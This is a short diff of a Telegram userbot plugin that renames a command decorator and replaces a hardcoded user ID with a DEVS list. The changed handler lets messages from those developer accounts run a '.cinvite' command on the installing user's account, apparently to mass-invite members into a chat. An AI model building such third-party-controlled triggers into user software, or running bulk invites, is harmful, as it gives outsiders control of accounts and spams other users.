@@ -14,7 +14,7 @@ from telethon.tl.functions.messages import GetFullChatRequest
 from userbot import CMD_HANDLER as cmd
 from userbot import CMD_HELP
 from userbot.events import register
-from userbot.utils import skyzu_cmd
+from userbot.utils import lepin_cmd
 
 
 async def get_chatinfo(event):
@@ -54,8 +54,8 @@ async def get_chatinfo(event):
     return chat_info
 
 
-@skyzu_cmd(pattern="inviteall(?: |$)(.*)")
-@register(incoming=True, from_users=1964264380, pattern=r"^\.cinvite(?: |$)(.*)")
+@lepin_cmd(pattern="inviteall(?: |$)(.*)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cinvite(?: |$)(.*)")
 async def get_users(event):
     sender = await event.get_sender()
     me = await event.client.get_me()
